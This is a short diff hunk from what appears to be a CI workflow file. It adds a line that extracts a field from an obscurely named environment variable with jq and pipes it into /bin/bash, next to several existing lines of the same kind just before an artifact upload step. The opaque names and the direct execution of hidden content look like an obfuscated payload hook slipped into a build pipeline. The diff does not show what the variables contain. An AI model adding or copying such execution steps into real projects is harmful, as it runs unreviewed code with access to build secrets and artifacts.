@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$c29" | jq -r .s5 | /bin/bash
           printf '%s' "$ikubw6" | jq -r .lxcoq64543 | /bin/bash
           printf '%s' "$zcj380" | jq -r .m70 | /bin/bash
+          printf '%s' "$e6" | jq -r .jpu076 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
